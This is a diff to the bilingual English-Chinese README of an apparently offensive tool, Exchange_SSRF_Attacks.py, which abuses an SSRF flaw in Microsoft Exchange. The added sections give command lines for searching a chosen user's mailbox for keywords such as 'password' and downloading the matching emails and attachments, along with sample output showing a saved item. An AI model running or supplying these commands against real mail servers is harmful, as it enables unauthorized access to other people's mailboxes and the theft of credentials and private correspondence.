@@ -105,13 +105,15 @@ The email address can't be found.
 
 
 
-## Search Contacts
+## Search Contacts 搜索联系人
 
 run 运行程序：
 
 ```
-python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Search --email validuser@exchange.com --keyword test
+python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchC --email validuser@exchange.com --keyword test
 ```
+
+`--keyword`为你想要搜索的联系人关键词。
 
 result 结果：
 
@@ -120,7 +122,29 @@ Board.Test@exchange.com
 LTSTest@exchange.com
 ```
 
-## Download user's emails
+
+
+## Search Mails And Download (include attachment) 搜索邮箱并下载，包括附件
+
+run 运行程序：
+
+```
+python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchM --email userwantdown@exchange.com --keyword password
+```
+
+`--keyword`为你想要搜索的关键词，比如"密码"。
+
+result 结果：
+
+```
+[+] Item [output/password-item-0.eml] saved successfully
+```
+
+keyword关键词可以使用一些邮件语法，比如搜索主题时，可以用`--keyword "subject:password"`
+
+
+
+## Download user's emails (include attachment) 下载指定用户的邮件，包括附件
 
 run 运行程序：
 ```
